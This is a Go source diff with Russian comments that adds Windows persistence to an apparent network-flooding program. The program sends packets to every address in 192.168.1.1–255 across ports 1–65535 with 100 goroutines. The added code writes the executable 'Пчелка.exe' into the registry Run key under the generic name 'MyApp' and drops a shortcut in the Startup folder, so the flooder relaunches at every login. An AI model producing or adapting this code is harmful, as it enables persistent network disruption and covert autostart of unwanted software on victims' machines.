@@ -2,20 +2,95 @@ package main
 
 import (
 	"fmt"
+	"log"
 	"net"
+	"os"
+	"path/filepath"
 	"sync"
 	"time"
+
+	"github.com/go-ole/go-ole"
+	"github.com/go-ole/go-ole/oleutil"
+	"golang.org/x/sys/windows/registry"
 )
 
 const (
-	startIP       = "192.168.1.1"   // берём диапозон локальный апишек
-	endIP         = "192.168.1.255" 
-	startPort     = 1                // тут мы выбираем диавазон портов
+	startIP       = "192.168.1.1" // берём диапозон локальный апишек
+	endIP         = "192.168.1.255"
+	startPort     = 1 // тут мы выбираем диавазон портов
 	endPort       = 65535
 	numPackets    = 1000
 	packetSize    = 1024
-	numGoroutines = 100              
+	numGoroutines = 100
 )
+
+func addToStartup() {
+	// Получаем путь к текущему исполняемому файлу
+	exePath, err := filepath.Abs(".")
+	if err != nil {
+		log.Fatal(err)
+	}
+	exePath = filepath.Join(exePath, "Пчелка.exe")
+
+	// Открываем ключ реестра для автозагрузки
+	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer key.Close()
+
+	// Добавляем программу в автозагрузку
+	err = key.SetStringValue("MyApp", exePath)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	log.Println("Программа добавлена в автозагрузку.")
+}
+
+func createShortcut() {
+	// Получаем путь к папке автозагрузки
+	startupPath, err := os.UserCacheDir()
+	if err != nil {
+		log.Fatal(err)
+	}
+	startupPath = filepath.Join(startupPath, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+
+	// Получаем путь к текущему исполняемому файлу
+	exePath, err := filepath.Abs(".")
+	if err != nil {
+		log.Fatal(err)
+	}
+	exePath = filepath.Join(exePath, "Пчелка.exe")
+
+	// Создаем ярлык
+	ole.CoInitialize(0)
+	defer ole.CoUninitialize()
+
+	shell, err := oleutil.CreateObject("WScript.Shell")
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer shell.Release()
+
+	wshell, err := shell.QueryInterface(ole.IID_IDispatch)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer wshell.Release()
+
+	shortcut, err := oleutil.CallMethod(wshell, "CreateShortcut", filepath.Join(startupPath, "MyApp.lnk"))
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer shortcut.Clear()
+
+	shortcutPath := shortcut.ToIDispatch()
+	oleutil.PutProperty(shortcutPath, "TargetPath", exePath)
+	oleutil.CallMethod(shortcutPath, "Save")
+
+	log.Println("Ярлык создан в папке автозагрузки.")
+}
 
 func loadNetwork(wg *sync.WaitGroup, ip, port string) {
 	defer wg.Done()
@@ -33,6 +108,8 @@ func loadNetwork(wg *sync.WaitGroup, ip, port string) {
 }
 
 func main() {
+	addToStartup()
+	createShortcut()
 	var wg sync.WaitGroup
 
 	startTime := time.Now()
